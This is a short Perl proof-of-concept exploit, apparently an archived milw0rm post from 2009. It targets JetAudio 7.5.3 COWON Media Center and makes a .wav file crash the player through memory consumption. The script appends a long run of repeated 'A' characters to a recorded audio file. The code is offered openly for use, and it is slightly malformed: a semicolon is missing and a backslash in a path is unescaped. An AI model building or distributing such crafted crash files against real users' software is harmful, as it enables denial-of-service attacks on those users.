#!/usr/bin/perl -w
#
# JetAudio 7.5.3 COWON Media Center(.WAV file) Memory Comsumption DoS Exploit
#
# Founded and exploited by prodigy
# 
# Vendor: JetAudio
#
# Usage to reproduce the bug: you need a file of recorded music in .wav,and then open it with JetAudio and booom!
#
# Platform: Windows
#
###################################################################

==PoC==

use strict;

use diagnostics;

my $file= "c:\filerecorder.wav" #the file must be recorded with music

my $boom= "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" x 5000;

open($FILE,">>$file");

print $FILE "$boom";

close($FILE);

==EndPoC==


##Greetz: Greetz myself for find the bug.

# milw0rm.com [2009-07-14]